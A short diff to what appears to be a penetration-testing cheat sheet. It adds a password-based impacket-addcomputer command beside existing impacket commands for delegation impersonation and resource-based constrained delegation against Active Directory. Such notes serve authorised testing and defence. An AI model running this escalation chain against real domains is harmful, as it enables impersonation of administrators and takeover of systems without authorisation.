@@ -50,6 +50,7 @@ impacket-getST -spn <SPN> -impersonate administrator <DOMAIN>/<C_DELEGATION_ACCO
 
 # addcomputer (powermad alternative)
 impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'h4x' <DOMAIN>/<ACC_WITH_GENERIC_WRITE> -hashes :<NTHASH>
+impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'h4x' -dc-ip <DC_IP> <DOMAIN>/<ACC_WITH_GENERIC_WRITE>:<PASS>
 
 # rbcd
 impacket-rbcd -action write -delegate-to "<TARGET_COMPUTER_ACC>$" -delegate-from "myComputer$" <DOMAIN>/<ACC_WITH_GENERIC_WRITE> -hashes :<NTHASH>
